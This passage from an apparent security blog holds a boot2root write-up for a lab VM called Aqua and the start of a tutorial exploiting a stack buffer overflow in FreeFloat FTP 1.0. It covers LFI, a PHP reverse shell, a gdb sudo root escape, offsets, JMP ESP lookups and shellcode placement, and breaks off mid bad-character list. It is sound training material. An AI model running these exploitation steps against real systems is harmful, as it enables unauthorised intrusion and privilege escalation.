<p><strong>Q2</strong>: Is taking OSCE the only way I can learn binary exploitations/exploit development?<br />
<strong>Meow</strong> : No, not at all. There are other courses that offer the same thing such as eLearnSecurity XDS , Corelan trainings, etc.. You don’t even need a cert to say that you “know” exploit development. For me, certifications act as my own way of benchmarking my skillset. I know that I will surely forget what I have learned in OSCE, OSCP etc.. if I didn’t maintain my technical skills, so it is up to my responsibilities to maintain my qualifications as an OSCE holder. You don’t need to do the same way if you don’t want to. Knowledge can be gained even without certifications.</p>

<p><strong>Q3</strong>: Hi, can you tell me what are the exam questions?<br />
<strong>Meow</strong> : Meow!</p>

<h1 id="fin">Fin</h1>

<p>Thank you for reading! See you next time.</p>

<p><img src="/musubi/assets/osce/shaw.gif" alt="shaw" /></p>

<h2 id="credits">Credits</h2>

<p>Special thanks to mreiaz and his cat, Kassim, Jasveer , and others who have helped me throughout the journey. Without you guys, I won’t be able to reach this far… You guys rocks!</p>

<p><img src="/musubi/assets/osce/bowmeow.gif" alt="bowmeow" /></p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[Yee haw! Last week I just received a mail from Offsec saying that I have passed the Offensive Security Certified Expert (OSCE) exam and here is my review.]]></summary></entry><entry><title type="html">VM Aqua Boot2Root Writeup - Speedrun Edition</title><link href="http://localhost:4000/musubi/others/vm_aqua" rel="alternate" type="text/html" title="VM Aqua Boot2Root Writeup - Speedrun Edition" /><published>2020-01-17T00:00:00+08:00</published><updated>2020-01-17T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/vm_aqua_writeup_SE</id><content type="html" xml:base="http://localhost:4000/musubi/others/vm_aqua"><![CDATA[<p>Yo! This is my boot2root writeup for <strong>Aqua</strong> vm. For those who didn’t manage to play with it yet, download the <a href="#">vm</a> and come back when you have finished or when you are stuck.</p>

<p>or…, if you want to play with an easier vm, check this <a href="https://www.vulnhub.com/entry/nezuko-1,352/">out</a>.</p>

<h1 id="about-aqua-vm">About Aqua VM</h1>

<p>Name : Aqua</p>

<p>Difficulty : Intermediate to hard</p>

<h2 id="enumeration">Enumeration</h2>

<p>In this case, the <strong>IP</strong> for the target machine is <code class="language-plaintext highlighter-rouge">10.0.2.6</code>.</p>

<p>These are the following open ports.</p>

<p><img src="/musubi/assets/aqua/1.png" alt="1" /></p>

<p>When going through the webpage, we found this page.</p>

<p><img src="/musubi/assets/aqua/2.png" alt="2" /></p>

<p>When clicking the <strong>“Sure, I’ll help”</strong>
button, we are redirected to another page which shows a potential credential.</p>

<p><img src="/musubi/assets/aqua/3.png" alt="3" /></p>

<p><code class="language-plaintext highlighter-rouge">megumin:watashiwamegumin</code></p>

<p>When running <strong>nikto</strong> on the target we found <strong>login.php</strong>.</p>

<p><img src="/musubi/assets/aqua/4.png" alt="4" /></p>

<h3 id="loginphp">Login.php</h3>

<p><img src="/musubi/assets/aqua/4.2.png" alt="4.2" /></p>

<p>Using the credential found, we managed to log in.</p>

<p><img src="/musubi/assets/aqua/5.png" alt="5" /></p>

<p>The <strong>url</strong> is vulnerable to <strong>LFI(local file inclusion)</strong> as seen below.</p>

<p><img src="/musubi/assets/aqua/6.png" alt="6" /></p>

<h2 id="exploitation">Exploitation</h2>

<p>Upon further enumeration, we found that the port 21 can be opened by using port knocking. It was filtered when nmap result showed up. The knockd config file can be found at <code class="language-plaintext highlighter-rouge">/etc/knockd.conf</code> in the target machine.</p>

<p><img src="/musubi/assets/aqua/7.png" alt="7" /></p>

<p>Image below shows the result before and after port knocking.</p>

<p><img src="/musubi/assets/aqua/8.png" alt="8" /></p>

<p>Using the same credential , we managed to login into the <strong>FTP</strong> service.</p>

<p>The content of <strong>hello.php</strong> is the same as in the index page of <strong>Megumin</strong> secret diary we saw last time. This means that if we put our <strong>php reverse shell</strong> payload in this directory, we can get a shell by browsing through the page using <strong>LFI</strong> vulnerability found earlier.</p>

<p><img src="/musubi/assets/aqua/9.png" alt="9" /></p>

<p><img src="/musubi/assets/aqua/9.1.png" alt="9.1" /></p>

<p>The directory <strong>“production/”</strong> is writable so we will put our reverse shell in there.</p>

<p><img src="/musubi/assets/aqua/10.png" alt="10" /></p>

<p>The file <code class="language-plaintext highlighter-rouge">notes</code> revealed the absolute path of the current directory.</p>

<p><img src="/musubi/assets/aqua/11.png" alt="11" /></p>

<p>This means that, by going to <code class="language-plaintext highlighter-rouge">http://10.0.2.6/home.php?showcase=../deployment/production/ourreverseshell.php</code> , our payload will be executed.</p>

<p><img src="/musubi/assets/aqua/12.png" alt="12" /></p>

<h2 id="privilege-escalation-i">Privilege escalation I</h2>

<p>Upon reading <code class="language-plaintext highlighter-rouge">/etc/sudoers</code> file, we found out that these users can run commands using <strong>sudo</strong> privileges without password.</p>

<p><strong>Aqua : /root/quotes, /root/esp, /usr/bin/gdb</strong></p>

<p><strong>Megumin : /home/aqua/Desktop/backdoor</strong></p>

<p>Using the same credential, we managed to login as <strong>megumin</strong>.</p>

<p><img src="/musubi/assets/aqua/13.png" alt="13" /></p>

<h2 id="privilege-escalation-ii">Privilege escalation II</h2>

<p>And as megumin, we can run <code class="language-plaintext highlighter-rouge">/home/aqua/Desktop/backdoor</code> using sudo privilege.</p>

<p><img src="/musubi/assets/aqua/14.png" alt="14" /></p>

<p>When rerunning nmap on the target, we found that port <strong>1337</strong> is open.</p>

<p><img src="/musubi/assets/aqua/15.png" alt="15" /></p>

<p>We then try to connect to the port using netcat and get a shell.</p>

<p><img src="/musubi/assets/aqua/16.png" alt="16" /></p>

<h2 id="privilege-escalation-iii---easier-method">Privilege escalation III - Easier method</h2>

<p>As aqua we can run gdb with sudo privilege without using the password.</p>

<p><img src="/musubi/assets/aqua/17.png" alt="17" /></p>

<p>We can get a root shell using gdb by following command.</p>

<p><code class="language-plaintext highlighter-rouge">sudo gdb -nx -ex '!sh' -ex quit</code></p>

<p><img src="/musubi/assets/aqua/18.png" alt="18" /></p>

<h2 id="privilege-escalation-iii---without-using-usrbingdb">Privilege escalation III - Without using /usr/bin/gdb</h2>

<p>For your information, this is my intended path of getting to root shell. But as I want to give a great experience to everyone including those who didn’t know about buffer overflow on Linux, so I have decided to make an easier method to get into root.</p>

<p>By running <code class="language-plaintext highlighter-rouge">sudo /root/quotes</code>, we know that the binary will print out our name and generate a random quote for us.</p>

<p><img src="/musubi/assets/aqua/21.png" alt="21" /></p>

<p>In aqua home directory, we can get the source code for <code class="language-plaintext highlighter-rouge">/root/quotes</code> and <code class="language-plaintext highlighter-rouge">/root/esp</code> binaries which is located at this <a href="https://github.com/yunaranyancat/personal_projects/tree/master/project_9">link</a>.</p>

<p><img src="/musubi/assets/aqua/19.png" alt="19" /></p>

<p>We also know that <code class="language-plaintext highlighter-rouge">/root/esp</code> shows the address of the <strong>ESP</strong> of the machine and that the <strong>ASLR</strong> is not enabled.</p>

<p><img src="/musubi/assets/aqua/20.png" alt="20" /></p>

<p>Based on the source code, the possible vulnerable part is at the <strong>getname</strong> method which uses <strong>strcpy</strong>. If we put a name longer than the size of the buffer, this can corrupt the memory thus can be exploited to gain a shell via buffer overflow vulnerability.</p>

<p><img src="/musubi/assets/aqua/22.png" alt="22" /></p>

<p>By knowing the environment of the target, we will make a debugging machine which is the exact copy of the target OS.</p>

<p><img src="/musubi/assets/aqua/23.png" alt="23" /></p>

<p>It seems like the target OS is using <strong>Linux Lite 3.8 32 bits</strong>.</p>

<p><img src="/musubi/assets/aqua/lite.png" alt="lite" /></p>

<p>To mimic the situation of the target machine, we will download the source code for <strong>quotes.c</strong> and <strong>esp.c</strong> as root then debug it using non root user.</p>

<p><img src="/musubi/assets/aqua/24.png" alt="24" /></p>

<p>By default, <strong>ASLR</strong> is enabled. To disable <strong>ASLR</strong>, run the following command.</p>

<p><code class="language-plaintext highlighter-rouge">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>

<p><img src="/musubi/assets/aqua/25.png" alt="25" /></p>

<p>Then compile the binaries using following options.</p>

<p>esp.c : <code class="language-plaintext highlighter-rouge">gcc -fno-stack-protector -z execstack -no-pie esp.c -o esp</code></p>

<p>quotes.c ; <code class="language-plaintext highlighter-rouge">gcc -fno-stack-protector -z execstack -no-pie quotes.c -o quotes</code></p>

<p><img src="/musubi/assets/aqua/26.png" alt="26" /></p>

<p>Then give sudo privilege to non root user to execute the binary and start debugging.</p>

<p><img src="/musubi/assets/aqua/27.png" alt="27" /></p>

<p>You can use anything you want for the exploit development but in this writeup, I will be using <a href="https://github.com/longld/peda">peda</a>.</p>

<p>Open the binary in gdb by running <code class="language-plaintext highlighter-rouge">sudo gdb -q /root/quotes</code> .</p>

<p><img src="/musubi/assets/aqua/28.png" alt="28" /></p>

<p>Disassemble the main program using <code class="language-plaintext highlighter-rouge">disas main</code> .</p>

<p><img src="/musubi/assets/aqua/29.1.png" alt="29.1" /></p>

<p><img src="/musubi/assets/aqua/29.2.png" alt="29.2" /></p>

<p>Disassemble the getname function using <code class="language-plaintext highlighter-rouge">disas getname</code> and we can see that the method <strong>strcpy</strong> is being called.</p>

<p><img src="/musubi/assets/aqua/30.png" alt="30" /></p>

<p>Let’s try to overflow the program by running <code class="language-plaintext highlighter-rouge">r $(python -c 'import sys;sys.stdout.write("A"*100)')</code> which will print out 100 A’s and will be parsed to the program as our <strong>name</strong> variable.</p>

<p><img src="/musubi/assets/aqua/31.png" alt="31" /></p>

<p>It seems like we managed to overwrite the <strong>EIP</strong>. To find the <strong>offset</strong> of the <strong>EIP</strong>, we need to use a pattern of unique strings. Since peda has this functionality, we can use them.</p>

<p>Create a pattern of 100 characters by running <code class="language-plaintext highlighter-rouge">pattern_create 100 pat</code> . This will store the pattern in a file called <strong>pat</strong>.</p>

<p><img src="/musubi/assets/aqua/32.png" alt="32" /></p>

<p>Rerun the program and parse the <strong>pattern</strong> as the name argument.</p>

<p><img src="/musubi/assets/aqua/33.png" alt="33" /></p>

<p><img src="/musubi/assets/aqua/33.2.png" alt="33.2" /></p>

<p>Using <strong>pattern_search</strong> command in peda. We will find the offset of the EIP which is at <strong>44</strong>.</p>

<p><img src="/musubi/assets/aqua/34.png" alt="34" /></p>

<p>Our exploit should be like this :</p>

<p><strong>A*44 + [EIP] + padding + shellcode</strong></p>

<p>Now, to verify if we have the right offset. We need to change our buffer.</p>

<p><code class="language-plaintext highlighter-rouge">gdb-peda$ r $(python -c 'import sys;sys.Stdout.write(("A"*44) + ("B"*4) + ("\x90"*32) + ("C"*23))')</code></p>

<p><img src="/musubi/assets/aqua/35.png" alt="35" /></p>

<p>For padding, we will add <strong>32 bytes of NOPs</strong> (no-operation opcode) so that it will do nothing and keep sliding to the next opcode until it reaches our shellcode. This is normally called as <strong>NOPsleds</strong> or <strong>NOP slides</strong>.</p>

<p><img src="/musubi/assets/aqua/36.png" alt="36" /></p>

<p>As we can see below, after the execution of the <strong>EIP</strong>, our <strong>NOPs</strong> are on top of the stack where <strong>ESP</strong> points to. Based on the disassembled <strong>getname</strong> method earlier, the last instruction is <strong>ret</strong>.</p>

<p><img src="/musubi/assets/aqua/ret.png" alt="ret" /></p>

<p>So if all is good, once <strong>ret</strong> is executed, the opcodes inside the address that is pointed by <strong>EIP</strong> will be executed, which is our <strong>NOPsleds</strong>. So, we need to put the address where our <strong>NOPsleds</strong> is located into our user controlled <strong>EIP</strong>.</p>

<p>So let’s put a breakpoint at the <strong>ret</strong> instruction and look at the stack at the moment of the execution.</p>

<p><img src="/musubi/assets/aqua/37.png" alt="37" /></p>

<p><img src="/musubi/assets/aqua/37.2.png" alt="37.2" /></p>

<p>Boom! We hit our first breakpoint!</p>

<p>Now, we can replace our Cs after the padding with the real shellcode. This is the <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">shellcode</a> that we will be using. You also can use another shellcode which may spawn a reverse shell or anything else.</p>

<p>Rerun the program with modified payload and put a breakpoint at the end of the <code class="language-plaintext highlighter-rouge">getname</code> method.</p>

<p><img src="/musubi/assets/aqua/38.png" alt="38" /></p>

<p>Once we hit our breakpoint, run <code class="language-plaintext highlighter-rouge">c</code> to continue the execution.</p>

<p><img src="/musubi/assets/aqua/39.png" alt="39" /></p>

<p>So far so good, now run the binary outside gdb and put in our payload.</p>

<p><img src="/musubi/assets/aqua/40.png" alt="40" /></p>

<p>We managed to get a root shell in our debugging machine.</p>

<p>Now time for the tricky part. The <strong>ESP</strong> of our debugging machine and the target machine is not exactly the same at the moment. This means we need to modify our <strong>EIP</strong> address little by litte until it hits the right place. (It’s like playing jackpot, but better.)</p>

<h3 id="debugging-machine-esp-address-0xbffffbe0--address-a">Debugging machine ESP address: 0xbffffbe0 –&gt; Address A</h3>
<h3 id="debugging-machine-eip-address-0xbffff330--address-i">Debugging machine EIP address: 0xbffff330 –&gt; Address I</h3>

<h3 id="aqua-machine-esp-address-0xbffffc30--address-b">Aqua machine ESP address: 0xbffffc30 –&gt; Address B</h3>
<h3 id="aqua-machine-eip-address---address-ii">Aqua machine EIP address: ? –&gt; Address II</h3>

<p><img src="/musubi/assets/aqua/41.png" alt="41" /></p>

<p>We can see that the <strong>B &gt; A</strong> , means it is possible that <strong>II &gt; I</strong> .We will run our original payload first to see the outcome.</p>

<p><img src="/musubi/assets/aqua/42.png" alt="42" /></p>

<p>We will slowly increment <strong>Address I</strong> by <strong>10h</strong> and wait for the magic to happen.</p>

<p><img src="/musubi/assets/aqua/43.png" alt="43" /></p>

<p>And here we are. We got a shell! And a beautiful ascii art of <strong>Megumin</strong>.</p>

<p><img src="/musubi/assets/aqua/44.png" alt="44" /></p>

<p>Thank you for playing with my machine and do tell <a href="https://twitter.com/yunaranyancat">me</a> what should I improve on next time. Constructive criticisms are greatly appreciated. But pls don’t attack me too much. I’m scared. <strong>&gt;w&lt;</strong></p>

<p><img src="/musubi/assets/aqua/bang.gif" alt="bang" /></p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[Yo! This is my boot2root writeup for Aqua vm. For those who didn’t manage to play with it yet, download the vm and come back when you have finished or when you are stuck.]]></summary></entry><entry><title type="html">Binary Exploitation 0x01 : Vanilla EIP Overwrite Win32 Buffer Overflow</title><link href="http://localhost:4000/musubi/notes/vanillaeipoverwrite" rel="alternate" type="text/html" title="Binary Exploitation 0x01 : Vanilla EIP Overwrite Win32 Buffer Overflow" /><published>2020-01-01T00:00:00+08:00</published><updated>2020-01-01T00:00:00+08:00</updated><id>http://localhost:4000/musubi/notes/binary_exploitation_0x01</id><content type="html" xml:base="http://localhost:4000/musubi/notes/vanillaeipoverwrite"><![CDATA[<p>It is time to play with the most simplest form of binary exploitation, <strong>vanilla EIP overwrite buffer overflow with no stack protection</strong>.</p>

<p><img src="/musubi/assets/binary0x01/muchhax.jpg" alt="muchhax" /></p>

<p>So, let’s start with the basic : What is buffer overflow?</p>

<p><img src="/musubi/assets/binary0x01/buffer-overflow.png" alt="bo" /></p>

<p>Normally, to trigger this vulnerability, a huge amount of input is inserted which leads the program to be unable to process the input properly.</p>

<p>For example , in this case, let’s say there is a program which accepts an input from the user, for example a program that simply asks a name from the user then prints it out back.</p>

<p>So the program flow would be like this.</p>

<p><code class="language-plaintext highlighter-rouge">Execute program -&gt; ask input -&gt; process input -&gt; print out input</code></p>

<p>Let’s assume that the program can only handles a name which has around <strong>30</strong> letters, which is, quite unusual for a normal people to have a name which is longer than that, or even that long.</p>

<p>However, if a user inserts a string which has a length longer than <strong>30</strong>, this can lead the program to crash (as the input may have overwritten something somewhere inside the memory of the program).</p>

<p>Since the memory is overwritten by user controlled input, especially the <strong>EIP</strong>, this can lead to remote code execution based on the input given by the user (which is the shellcode).</p>

<p>Now, it’s time to prove our theory…</p>

<p>In this demonstration, we will be using ;</p>

<ul>
  <li><strong>Windows XP SP3 32 bits</strong></li>
  <li><strong>FreeFloat FTP 1.0</strong></li>
</ul>

<p><img src="/musubi/assets/binary0x01/1.png" alt="1" /></p>

<ul>
  <li><strong>Immunity Debugger + Mona.py</strong></li>
  <li><strong>Kali Linux for developing the exploit</strong></li>
</ul>

<p><br />
<br /></p>

<p>Now, start the <strong>FTP Server</strong> and attach it on <strong>Immunity Debugger</strong>. In <strong>Immunity Debugger</strong>, go to <strong>File</strong> -&gt; <strong>Attach</strong> then look for the name of the application. Once attached, the application will be paused automatically, to resume, click on the play button or <strong>F9</strong>.</p>

<p><img src="/musubi/assets/binary0x01/4.0.png" alt="4.0" /></p>

<p><img src="/musubi/assets/binary0x01/4.png" alt="4" /></p>

<p>Please ensure that the target FTP server is reachable by the attacking machine (Kali) . Normally, user <code class="language-plaintext highlighter-rouge">anonymous</code> with password <code class="language-plaintext highlighter-rouge">anonymous</code> exists by default in the application.</p>

<p><img src="/musubi/assets/binary0x01/2.png" alt="2" /></p>

<p>By typing <code class="language-plaintext highlighter-rouge">?</code> , there is a lot of commands that can be tested for this vulnerability. So, let’s take <code class="language-plaintext highlighter-rouge">DIR</code> command for example. Let’s craft our skeleton exploit code first.</p>

<p><img src="/musubi/assets/binary0x01/3.png" alt="3" /></p>

<p>Now, we are ready to have fun.;)</p>

<p>To perform this attack efficiently, we will follow these steps;</p>

<ol>
  <li>Fuzz the application (insert various length of payloads until the program crashes and overwrites the <strong>EIP</strong>)</li>
  <li>Find the offset of the <strong>EIP</strong> (we need to find the exact location of the <strong>EIP</strong> before the overwrite, so we can get control of the <strong>EIP</strong>)</li>
  <li>Replace the <strong>EIP</strong> with something meaningful (something that can lead to our crafted shellcode, for example <strong>JMP ESP</strong>)</li>
  <li>Find bad characters (bad characters, as the name implies, are hex values that can corrupt our exploit code. We will see an example later..)</li>
  <li>Craft shellcode (msfvenom bla bla bla…)</li>
  <li>Add few NOPsleds before the shellcode (I’ll tell you why later..)</li>
</ol>

<p><br /><br /></p>

<h2 id="1--fuzzing-the-application">1 . Fuzzing the application</h2>

<p>For now, we will only be using manual fuzzing, which means, we will put different length of strings of <strong>As</strong> (\x41) in the payload until we managed to make it crash and overwrite something in the memory of the program, in this case, the <strong>EIP</strong>. Upon experimenting with various amount of payload, we will find that one of the suitable amount of payload is <strong>1000</strong> buffer of <strong>As</strong>.</p>

<p>Thus, our payload will look like this.</p>

<p><img src="/musubi/assets/binary0x01/5.png" alt="5" /></p>

<p>When we execute our exploit code, we will get this message in the debugger.</p>

<p><img src="/musubi/assets/binary0x01/6.png" alt="6" /></p>

<p>We can see in the debugger, our <strong>EIP</strong> has been overwritten.</p>

<h2 id="2-finding-the-eip-offset">2. Finding the EIP offset</h2>

<p>Okay, we managed to overwrite our <strong>EIP</strong> with our bunch of sent <strong>As</strong>. Now what? We need to find the exact location (offset) of the <strong>EIP</strong>, so that we can modify our <strong>As</strong> into something more interesting. Normally, to find the offset, we need to craft a list of unique strings which has a length of <strong>1000</strong> (in this case). Luckily, kali has a tool specifically for this kind of job.</p>

<p>Simply run in kali,</p>

<p><code class="language-plaintext highlighter-rouge">msf-pattern_create -l 1000</code></p>

<p><img src="/musubi/assets/binary0x01/7.png" alt="7" /></p>

<p>Replace the 1000 As in our payload with the crafted pattern.</p>

<p><img src="/musubi/assets/binary0x01/8.png" alt="8" /></p>

<p>Close the debugger, restart the application, reattach and resume the application. Run the exploit code with the crafted pattern as the payload. We will get something like this.</p>

<p><img src="/musubi/assets/binary0x01/9.png" alt="9" /></p>

<p>Now, the <strong>EIP</strong> is overwritten with <code class="language-plaintext highlighter-rouge">69413269</code> . Using <code class="language-plaintext highlighter-rouge">msf-pattern_offset</code> in kali, we will know the position of the <strong>EIP</strong> in our buffer.</p>

<p><code class="language-plaintext highlighter-rouge">msf-pattern_offset -l 1000 -q 69413269</code></p>

<p><img src="/musubi/assets/binary0x01/10.png" alt="10" /></p>

<p>The <strong>EIP</strong> is overwritten after <strong>247 As</strong>.</p>

<p>To ensure if this is correct, we will modify a bit our payload into something like this.</p>

<p><img src="/musubi/assets/binary0x01/11.png" alt="11" /></p>

<p>If the <strong>EIP</strong> is overwritten with <strong>4 Bs</strong> (\x42), this means that the offset is correct.</p>

<p><img src="/musubi/assets/binary0x01/12.png" alt="12" /></p>

<p>Yayy..</p>

<h2 id="3-replace-the-eip-with-something-meaningful">3. Replace the EIP with something meaningful</h2>

<p>Since we have conquered the <strong>EIP</strong>, now it is time to find a good location for our payload. Looking at the debugger, our remaining buffer after <strong>EIP</strong> are located at the address pointed by <strong>ESP</strong>.</p>

<p>Right click at the <strong>ESP</strong> and click <strong>Follow dump</strong> to check the content of the address pointed by the <strong>ESP</strong>.</p>

<p><img src="/musubi/assets/binary0x01/13.png" alt="13" /></p>

<p>Looking at the hex dump, it is shown that the address pointed by <strong>ESP</strong> starts at the <strong>9th Cs</strong> sent by our buffer. This means that, we need to add 8 bytes after <strong>EIP</strong> before we can put our shellcode. Or else, the <strong>ESP</strong> will not point to the start of our shellcode.</p>

<p><img src="/musubi/assets/binary0x01/14.png" alt="14" /></p>

<p>Some modification to our exploit code based on the explanation above.</p>

<p><img src="/musubi/assets/binary0x01/15.png" alt="15" /></p>

<p>Close the debugger, restart the application, reattach and resume the application.</p>

<p><img src="/musubi/assets/binary0x01/16.png" alt="16" /></p>

<p>Okay, since we know that our remaining buffer after the <strong>EIP</strong> overwrite can be found in the <strong>ESP</strong>, we can replace our <strong>EIP</strong> with an address that contains <strong>JMP ESP</strong> instruction in the program modules so that after the <strong>EIP</strong> has been executed, our shellcode will be executed after that. Something like,</p>

<p><code class="language-plaintext highlighter-rouge">buffer ---&gt; EIP [jmp esp] ---&gt; ESP [shellcode]</code></p>

<p>This is where mona is useful. For mona, we will need ;</p>

<ul>
  <li>List of modules the program is currently using</li>
  <li>List of addresses which contains <strong>JMP ESP</strong> instruction</li>
</ul>

<p>To find all of the modules, type</p>

<p>!mona modules</p>

<p><img src="/musubi/assets/binary0x01/17.png" alt="17" /></p>

<p>So, we will use <strong>SHELL32.dll</strong> for this demonstration. To find list of <strong>JMP ESP instruction</strong> addresses in the module, type</p>

<p><code class="language-plaintext highlighter-rouge">!mona find -s "\xff\xe4" -m SHELL32.dll</code></p>

<p><img src="/musubi/assets/binary0x01/18.png" alt="18" /></p>

<p>We will take the first address for now.. which is <strong>0x7cbd41fb</strong></p>

<p>Update our exploit code to look something like this.</p>

<p><img src="/musubi/assets/binary0x01/19.png" alt="19" /></p>

<h2 id="4-finding-bad-characters">4. Finding bad characters</h2>

<p>Bad characters are hex values that are not suitable for our shellcode. For example, <strong>\x00</strong> is a bad character because it serves as a <strong>NULL</strong> value or indicating the end of a string.</p>

<p>Note : Please be informed that our <strong>JMP ESP</strong> address also must not contain bad characters. So, we may need to change our <strong>JMP ESP</strong> address (0x7cbd41fb) later if it contains bad characters.</p>

<p>These are all possible hex values :</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="s2">"</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">13"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">19</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">1b</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">26"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">39"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">3b</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">3d</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">4c"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">5f"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">72"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">7b</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">85"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">87</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">94</span><span class="se">\x</span><span class="s2">95</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">98"</span>
